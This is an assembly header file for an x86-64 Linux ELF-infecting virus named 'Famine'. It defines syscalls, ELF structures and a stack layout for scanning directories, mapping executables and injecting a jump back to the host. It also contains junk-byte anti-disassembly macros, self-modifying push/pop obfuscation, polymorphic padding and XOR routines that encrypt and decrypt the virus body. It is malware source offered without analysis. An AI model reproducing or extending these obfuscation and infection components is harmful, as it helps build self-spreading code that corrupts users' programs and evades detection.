; ELF header data for comparisons

%define	_SYSV_			0x00010102464c457f
%define	_GNU_			0x03010102464c457f
%define	_DYN_			0x00000001003e0003
%define	_EXEC_			0x00000001003e0002
%define	SEGMENT_TYPE	0x0000000000000004
%define PF_R			0x4
%define	PF_X			0x1
%define PF_W			0x2

%define	_pwrite			18
%define _read			0x0
%define	_exit			60
%define	_open			2
%define	_close			3
%define	_fstat			5
%define	_mmap			9
%define	_munmap			11
%define	_getdents		78
%define	_chmod			90
%define _lseek			8
%define _sync			162
%define _fork			0x39

; File acces
%define	O_RDONLY			0o0000000
%define	O_RDWR				0o0000002
%define	O_DIRECTORY			0o0200000
%define	PATH_MAX			4096
%define	DT_REG				8
%define DT_DIR				4
%define END_SEEK			2
; mmap
%define	PROT_READ			0x1
%define	PROT_WRITE			0x2
%define	MAP_SHARED 			0x01
%define	MMAP_ERRORS			-4095

; Famine
%define FAMINE_SIZE			(_end - _start)
%define KEY_SIZE			5
%define STACK(x)			[(rbp - famine_size) + x]
%define	DIRENT_ARR_SIZE		1024
%define JMP					0xe9
%define EHDR_SIZE			64
%define PHDR_SIZE			56

%define JUMP_DECYPHER_OFFSET _start.OUI - _start +1
%define KEY_OFFSET			_start.key_offset - _start + 1
%define FACTOR_OFFSET		_start.factor_offset - _start + 2 

%define RETURN_JUMP_OFFSET	_end - _exx
%define RETURN_JUMP_VALUE_OFFSET _end - _exx - + 5

%define SIGNATURE_OFFSET	signature - _start + 44
%define BEGIN_SIGNATURE_OFFSET_FORM_END _end - signature - 1

%define POLY_OFFSET_1	_start.label_poly1 - _start
%define POLY_CRAP_SKIPPED_OFFSET inject_self.poly_crap_skipped - _start

%macro OBF_POLY_1 0
	OBF_PUSH_RAX
	OBF_PUSH_RDI
	call .pop9
	.pop9:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x90909090
	pop rdi
	.label_poly1:
	dd 0xAAAAAAAA
	mov rbx, 0x00000000
	mov dword[rax+12], ebx
	pop rax
%endmacro


%macro POLY_CRAP_SKIPPED 0
	.poly_crap_skipped:
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
%endmacro
; MACROS

%macro OBF_GENERIC 0
jmp short 0x2
db 0x0F
%endmacro

%macro OBF_GENERIC1 0
jmp short 0x2
db 0xDE
%endmacro

%macro OBF_GENERIC2 0
jmp short 0x2
db 0xF3
%endmacro

%macro OBF_PUSH_RAX 0
	jmp short 5
	push 0x500fDD90
%endmacro


%macro OBF_PUSH_RBX 0
	jmp short 5
	push 0x53909090
%endmacro

%macro OBF_PUSH_RCX 0
	jmp short 5
	push 0x5146EEF0
%endmacro

%macro OBF_PUSH_RDX 0
	jmp short 6
	db 0xF8
	push 0x5246EEF0
%endmacro

%macro OBF_PUSH_RSI 0
	jmp short 5
	db 0xF8
	dd 0x5646EEF0
%endmacro

%macro OBF_PUSH_RDI 0
	jmp short 5
	db 0x03
	dd 0x5702EEc0
%endmacro

%macro OBF_PUSH_RBP 0
	jmp short 5
	db 0x03
	dd 0x55380F66
%endmacro

%macro OBF_PUSH_RSP 0
	jmp short 5
	db 0x03
	dd 0x543A0F66
%endmacro

%macro OBF_PUSH_R8 0
	jmp short 4
	db 0x02
	dd 0x5041A0F6
%endmacro

%macro OBF_PUSH_R9 0
	jmp short 4
	db 0x02
	dd 0x5141C3EB
%endmacro

%macro OBF_PUSH_R10 0
	jmp short 4
	db 0x02
	dd 0x5241C3D0
%endmacro

%macro OBF_OVERWRITE_PUSHR8R9 0
	OBF_PUSH_R8
	call .pop
	.pop:
	pop r8
	mov rax, r8
	mov dword[r8+15], 0x51415041
	pop r8
	dd 0xADE1F1FF
	mov dword[rax+15], 0x0FDE21C3
%endmacro

%macro OBF_OVERWRITE_PUSHR10R11 0
	OBF_PUSH_R8
	call .pop1
	.pop1:
	pop r8
	mov rax, r8
	mov dword[r8+15], 0x53415241
	pop r8
	dd 0xFFADE1F1
	mov dword[rax+15], 0xAE0F1233
%endmacro

%macro OBF_OVERWRITE_PUSHR12R13 0
	OBF_PUSH_RDI
	call .pop2
	.pop2:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x55415441
	pop rdi
	dd 0xEEA0FDF1
	mov dword[rax+12], 0xCC010203
%endmacro

%macro OBF_OVERWRITE_PUSHR14R15 0
	OBF_PUSH_RDI
	call .pop3
	.pop3:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x57415641
	pop rdi
	dd 0xEEA0C3F1
	mov dword[rax+12], 0x09e97171
%endmacro

%macro OBF_OVERWRITE_POPR9R8 0
	OBF_PUSH_R8
	call .pop4
	.pop4:
	pop r8
	mov rax, r8
	mov dword[r8+15], 0x58415941
	pop r8
	dd 0xADE1F1FF
	mov dword[rax+15], 0xCDCE1212
%endmacro

%macro OBF_OVERWRITE_POPR11R10 0
	OBF_PUSH_R8
	call .pop5
	.pop5:
	pop r8
	mov rax, r8
	mov dword[r8+15], 0x5A415B41
	pop r8
	dd 0xFFADE1F1
	mov dword[rax+15], 0x66AEF700
%endmacro

%macro OBF_OVERWRITE_POPR13R12 0
	OBF_PUSH_RDI
	call .pop6
	.pop6:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x5C415D41
	pop rdi
	dd 0xEEA0FDF1
	mov dword[rax+12], 0xBBDFDEAD
%endmacro

%macro OBF_OVERWRITE_POPR15R14 0
	OBF_PUSH_RDI
	call .pop7
	.pop7:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x5E415F41
	pop rdi
	dd 0xEEA0C3F1
	mov dword[rax+12], 0x12131441
%endmacro



%macro OBF_POP_RAX 0
	jmp short 5
	push 0x580fDD90
%endmacro


%macro OBF_POP_RBX 0
	jmp short 5
	push 0x5B909090
%endmacro

%macro OBF_POP_RCX 0
	jmp short 5
	push 0x5941442F
%endmacro

%macro OBF_POP_RDX 0
	jmp short 6
	db 0xF8
	push 0x5A26EDA0
%endmacro

%macro OBF_POP_RSI 0
	jmp short 5
	db 0xF8
	dd 0x5E666EFC
%endmacro

%macro OBF_POP_RDI 0
	jmp short 5
	db 0x0f
	dd 0x5FE4E4c3
%endmacro

%macro OBF_POP_RBP 0
	jmp short 5
	db 0x03
	dd 0x5DCCEFFF
%endmacro

%macro OBF_POP_RSP 0
	jmp short 5
	db 0x03
	dd 0x5C3AEF6C
%endmacro

%macro OBF_POP_R8 0
	jmp short 4
	db 0x02
	dd 0x5841A0F6
%endmacro

%macro OBF_POP_R9 0
	jmp short 4
	db 0x02
	dd 0x5941C3EB
%endmacro

%macro OBF_POP_R10 0
	jmp short 4
	db 0x02
	dd 0x5A41C3D0
%endmacro

%macro PUSH 0
	OBF_PUSH_RAX
	OBF_PUSH_RBX
	OBF_PUSH_RCX
	OBF_PUSH_RDX
	OBF_GENERIC
	OBF_PUSH_RSI
	OBF_PUSH_RDI
	OBF_PUSH_RBP
	OBF_PUSH_RSP
	OBF_OVERWRITE_PUSHR8R9
	OBF_OVERWRITE_PUSHR10R11
	OBF_OVERWRITE_PUSHR12R13
	OBF_OVERWRITE_PUSHR14R15
%endmacro

%macro POP 0
	OBF_OVERWRITE_POPR15R14
	OBF_OVERWRITE_POPR13R12
	OBF_OVERWRITE_POPR11R10
	OBF_OVERWRITE_POPR9R8
	OBF_POP_RSP
	OBF_POP_RBP
	OBF_POP_RDI
	OBF_POP_RSI
	OBF_GENERIC
	OBF_POP_RDX
	OBF_POP_RCX
	OBF_POP_RBX
	OBF_POP_RAX
%endmacro



%macro CYPHER 0
	OBF_GENERIC
	xor r11, r11
	mov rdi, STACK(famine.key)  ; key
	OBF_GENERIC2
	mov rax, _start.enc_start
	lea rdx, STACK(famine.tocypher + _start.enc_start - _start)
	mov rcx, enc_end
	sub rcx, rax
	mov r12, STACK(famine.factor)
	OBF_GENERIC
	.cyphering:
		mov r11b, byte [rdx]
		xor r11, rdi
		mov byte [rdx], r11b
		inc rdx
		dec r12
		add rdi, r12
	loop .cyphering
%endmacro

%macro DECYPHER 0
	xor r11, r11
	.key_offset:
	mov rdi, 0xAA  ; key
	mov rax, .enc_start
	lea rdx, [rel .enc_start]
	mov rcx, enc_end
	sub rcx, rax
	.factor_offset:
	mov r12, 0xAA
	.decyphering:
		mov r11b, byte [rdx]
		xor r11, rdi
		mov byte [rdx], r11b
		inc rdx
		dec r12
		add rdi, r12
		loop .decyphering
%endmacro
;Structures

	struc	dirent
.d_ino:			resq	1	; 64-bit inode number
.d_off:			resq	1	; 64-bit offset to next structure
.d_reclen		resw	1	; Size of this dirent
.d_name			resb	1	; Filename (null-terminated)
.pad			resb	0	;  0 PADDING 
.d_type			resb	1	; byte TYPE
	endstruc



	struc	stat
.st_dev			resq	1	; ID of device containing file
.__pad1			resw	1	; Padding
.st_ino			resq	1	; Inode number
.st_mode		resd	1	; File type and mode
.st_nlink		resq	1	; Number of hard links
.st_uid			resd	1	; User ID of owner
.st_gid			resd	1	; Group ID of owner
.st_rdev		resq	1	; Device ID (if special file)
.__pad2			resw	1	; Padding
.st_size		resq	1	; Total size, in bytes
.st_blksize		resq	1	; Block size for filesystem I/O
.st_blocks		resq	1	; Number of 512B blocks allocated
.st_atim		resq	2	; Time of last access
.st_mtim		resq	2	; Time of last modification
.st_ctim		resq	2	; Time of last status change
.__unused		resq	3	; Unused
	endstruc



; ELF headers

	struc	elf64_ehdr
.e_ident		resb	16	; Magic number and other info
.e_type			resw	1	; Object file type
.e_machine		resw	1	; Architecture
.e_version		resd	1	; Object file version
.e_entry		resq	1	; Entry point virtual address
.e_phoff		resq	1	; Program header table file offset
.e_shoff		resq	1	; Section header table file offset
.e_flags		resd	1	; Processor-specific flags
.e_ehsize		resw	1	; ELF header size in bytes
.e_phentsize	resw	1	; Program header table entry size
.e_phnum		resw	1	; Program header table entry count
.e_shentsize	resw	1	; Section header table entry size
.e_shnum		resw	1	; Section header table entry count
.e_shstrndx		resw	1	; Section header string table index
	endstruc



	struc	elf64_phdr
.p_type			resd	1	; Segment type
.p_flags		resd	1	; Segment flags
.p_offset		resq	1	; Segment file offset
.p_vaddr		resq	1	; Segment virtual address
.p_paddr		resq	1	; Segment physical address
.p_filesz		resq	1	; Segment size in file
.p_memsz		resq	1	; Segment size in memory
.p_align		resq	1	; Segment alignment
	endstruc

; Structure for our variables on stack

	struc	famine
.dirents		resb	DIRENT_ARR_SIZE	; Array of dirents
.dir_fd			resq	1				; Directory fd
.file_path		resb	PATH_MAX		; File path Buffer
.new_dir		resb	PATH_MAX
.file_fd		resq	1				; Open file fd
.stat			resb	stat_size		; Buffer for stat struct
.file_size		resq	1				; Size of open file
.jmp			resb	5				; jmp :  e9 xx xx xx xx 
.file_data		resq	1				; Pointer to mmapped file data
.status_str		resb	110				; buf for /proc/self/status
.tocypher		resb	0x5000			; location to cyphered v
.key			resb	1				; location to key
.factor			resb	1				; factor to derivate key
.morph_sign_u	resb	1				; factor to add to signature
.morph_sign_d	resb	1				; factor to add to ssignature  tenth
.tmp_rand		resw	1				;
.commpath		resb	100				; path to commfiles
.dirents_proc	resb	DIRENT_ARR_SIZE	; Array of dirents for /proc
endstruc
